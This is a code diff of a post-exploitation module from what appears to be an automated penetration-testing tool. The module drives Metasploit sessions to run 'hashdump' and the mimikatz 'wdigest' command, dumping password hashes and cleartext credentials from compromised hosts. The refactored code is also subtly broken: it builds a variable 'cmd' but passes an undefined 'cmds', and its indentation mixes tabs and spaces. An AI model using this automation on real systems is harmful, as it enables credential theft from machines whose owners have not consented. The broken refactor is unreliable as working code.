@@ -1,10 +1,9 @@
-from core.actionModule import actionModule
+from core.msfActionModule import msfActionModule
 from core.keystore import KeyStore as kb
-from core.mymsf import myMsf
 from core.utils import Utils
 
 
-class post_msf_dumphashes(actionModule):
+class post_msf_dumphashes(msfActionModule):
     def __init__(self, config, display, lock):
         super(post_msf_dumphashes, self).__init__(config, display, lock)
         self.title = "Gather hashes from MSF Sessions"
@@ -29,52 +28,37 @@ class post_msf_dumphashes(actionModule):
             sessions = kb.get('shell/' + t + '/msf')
 
             if len(sessions) > 0:
-                # connect to msfrpc
-                msf = myMsf(host=self.config['msfhost'], port=self.config['msfport'], user=self.config['msfuser'],
-                            password=self.config['msfpass'])
-
-                if msf.isAuthenticated():
                     # loop over each target
                     for s in sessions:
                         # verify we have not tested this session before
                         if not self.seentarget(s):
                             # add the new IP to the already seen list
                             self.addseentarget(s)
-                            myMsf.lock.acquire()
-                            msf.execute("sessions -i " + str(s) + "\n")
-                            msf.sleep(int(self.config['msfexploitdelay']))
-                            msf.execute("hashdump\n")
-                            msf.sleep(int(self.config['msfexploitdelay']))
-                            msf.execute("background\n")
-                            msf.sleep(int(self.config['msfexploitdelay']))
+                            cmd = {
+                                    'config':[
+					    "sessions -i %s" % str(s),
+                                            "SLEEP",
+					    "hashdump",
+                                            "SLEEP",
+					    "background",
+                                            "SLEEP"
+                                        ],
+                                    'payload':'none'}
+                            result, outfile = self.msfExec(t, cmds)
 
-                            # TODO - process results and store results in KB
-                            # regex match on [^:]+:[^:]+:[^:]+:[^:]+:::
-                            outfile = self.config[
-                                          "proofsDir"] + self.shortName + "_HashDump_" + t + "_" + Utils.getRandStr(
-                                10)
-                            text = msf.getResult()
-                            myMsf.lock.release()
-                            Utils.writeFile(text, outfile)
-                            kb.add("host/" + t + "/files/" + self.shortName + "/" + outfile.replace("/", "%2F"))
 
-                            msf.execute("sessions -i " + str(s) + "\n")
-                            msf.sleep(int(self.config['msfexploitdelay']))
-                            msf.execute("load mimikatz\n")
-                            msf.sleep(int(self.config['msfexploitdelay']))
-                            msf.execute("wdigest\n")
-                            msf.sleep(int(self.config['msfexploitdelay']))
-                            msf.execute("background\n")
-
-                            # TODO - process results and store results in KB
-                            outfile = self.config[
-                                          "proofsDir"] + self.shortName + "_Mimikatz_" + t + "_" + Utils.getRandStr(
-                                10)
-                            text = msf.getResult()
-                            Utils.writeFile(text, outfile)
-                            kb.add("host/" + t + "/files/" + self.shortName + "/" + outfile.replace("/", "%2F"))
-
-            # clean up after ourselves
-            result = msf.cleanup()
+                            cmd = {
+                                    'config':[
+					    "sessions -i %s" % str(s),
+                                            "SLEEP",
+					    "load mimikatz",
+                                            "SLEEP",
+					    "wdigest",
+                                            "SLEEP",
+					    "background",
+                                            "SLEEP"
+                                        ],
+                                    'payload':'none'}
+                            result, outfile = self.msfExec(t, cmds)
 
         return
